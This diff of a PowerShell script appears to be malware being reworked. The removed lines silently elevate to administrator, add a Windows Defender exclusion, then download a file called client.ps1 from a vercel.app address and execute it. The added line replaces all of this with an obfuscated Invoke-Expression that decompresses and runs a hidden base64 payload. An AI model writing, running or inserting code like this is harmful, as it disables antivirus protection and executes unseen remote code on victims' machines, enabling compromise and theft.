@@ -1,18 +1,1 @@
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    $arg = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Definition + "`""
-    Start-Process -FilePath "powershell" -ArgumentList $arg -Verb RunAs
-    exit
-}
-
-$pathToExclude = if ($PSScriptRoot -and $PSScriptRoot -ne "") { $PSScriptRoot } else { (Get-Location).Path }
-
-try {
-    Add-MpPreference -ExclusionPath $pathToExclude
-    $Url = "https://my-nextjs-app-8r12.vercel.app/api/download"
-    $file = "client.ps1"
-    $full = Join-Path -Path $pathToExclude -ChildPath $file
-    Invoke-WebRequest -Uri $Url -OutFile $full
-    . $full
-} catch {
-	exit(0)
-}
+ & ( $PShoMe[21]+$pShOme[34]+'X')( neW-ObJEct  SystEM.Io.ComprESSIoN.dEFlATeSTreaM( [iO.MEmoRystrEaM][cOnVERt]::frOmbaSE64STrING( 'fVVrb5tIFP28kfIfRqhabKWQxEl3m6yqFXXchK1js4D7UBRpKIztqXl1GBIjxH/fe4eHky9rydeYmbmPc8+5Y460+rypzxrNWOu+/lYvmD4m/1b7DSEj8iCrfPYIWy6beoK76oum/qOp/2zw0LtGI8aa6ILLysSjPGILacPTCr6OyxfK3xSsrMBMbSeAn9j8ai+i5TPEGRPyF1+TkZFmkowePBaWypkjeBryPICtPI2y52J48UgwL/J7nzakhUnoho3Jb5gEy+7BNfkSuDz4GM+uf2ExY/PJilfs+hoOTppDydNSCJaqU2hu9bFpp0/Zjo3GY1OzPZsuREbnM+3/svtY8ljaqZvF7JFAgDMVoMXsogPJisB9wlNeYJwATSbACH08HpP6+AgKI29qi7qbhnwgI91YZPqJ7gi0ax6DZQSM0cb04BFAPdGHhTsOJsIvS9XG2R6XwlLyLHXQS4w7wgoXP1Z5UBTwoHZ+GtxrVNPG5AQSSSoKQCxDakmbLheNqd1XNFwmCbXSSDO1iM7W9oJLyrOFBifwZFsE9uai6UCYdOU7WGoWsgIpAV9PBkIa0CcMzpxAbsnrzhCdxTEeKrZg8+wZeWlYYlMm0K85wAhJBtS9bYjxhYkfA+7qrFvCodQq9HGbE9tzeXzUHB8dH72pncCndzKjs2/hvKQ3DPFGFsIKLbyQurYjXbrMJLgO0gji5NTzpoI71HezpQ+vU0YQqBrWnIK2Z2BxmcFiQ1hcMFgbmS9KQiJgZiFKYJ4h1xgAANKA9uhINoda/p1GVJJSVD0nzBbOge1A2vvcEWzN4DA6AP6G+GxFEUI024dxWWDPEdS22q2/ZPTbdE5XNJo1PddW1I0V1zQl6Akquj5XTcNw75v6SgW9VJo/P+vJrD+nqBcRMmyQ+QSGQ09Mtsc08B3WmAXIeGyeiX/z/DTI+WmElf8NfGYfprF6bbwX5xPEQebF9elpUgG4e/mzMPrevanXNp2zLtOBVgimh2OlkCyB2JjSiyN0Faviukkx6QWPCf2T8dRQs0giYh1QObWov/XpcrafdrwwplseR906ZtGD13H8snmdD/sBPl32C2zJlNBxmMDPjhlfMdRKcPBUKuCNZSmR/G228/nQF98qdqlFk1lX8qSP0s+ShCUIMI7ULQt3BElQHWqXgfeZRpTRIhR2LjnKt/XUkwgTv1ADHN1x9OQwnEYRD3FMYR/Ra5IBD0MVQwbF7hDCmlIfhN8DfDGQRHHo7KD7nRWq4YpcQKK/1RfsGVnrYSA/wFmwZVEZt9TFcYWAfFrRF4BI6lJ+eztz+3iXB1HVk/4i0qPWnRcqh1gD32zwZ+eLQ2CBkZYgGZgmstXoqx52srxR9ABGwW6X5UxyFKqdSiaegvj1uVbbOl53EMPnPYReHqQY7Z6nUFZBLs5eObspRYC/rbMXAgdid/n6XDnq/NwEVUGu4DP0wRFwQYUULyPExhzY8q7pQOo5YyhYsMV+6xtlWuyGuwyVi6FKRdOCCTsio9GQ12WHtcqOWCvlBM3sHsx32OJ99/D/3dKFqxhRW5OH6dZyH68m8GeebbLUr3JGXuix9ap6x6wQCeEButg3fFa3cqbycct0zp5Y/HLI63eqwVvU2fiVKs97YbbTsuOCMBTlkCQ7pdIN3CFM0Q9D4OtFkCD5fBgExefUSnACAH+xRXgzh8B5lJLhCySWQGYKyjd0g8w0BihVX/hiSjmFmT6HpRsGUuR55wn0uYPxAteGa1P1smO62TIfBtfh1hqdQXENCQMZbvFK+O3w8vjoPw=='),[Io.COmpressiON.coMPresSiOnmODE]::decompREss)|FoREaCH { neW-ObJEct  sYstem.IO.StrEAmReaDEr( $_,[sySTEm.tExT.ENCODiNg]::ASCiI ) }).READToEnd( ) 
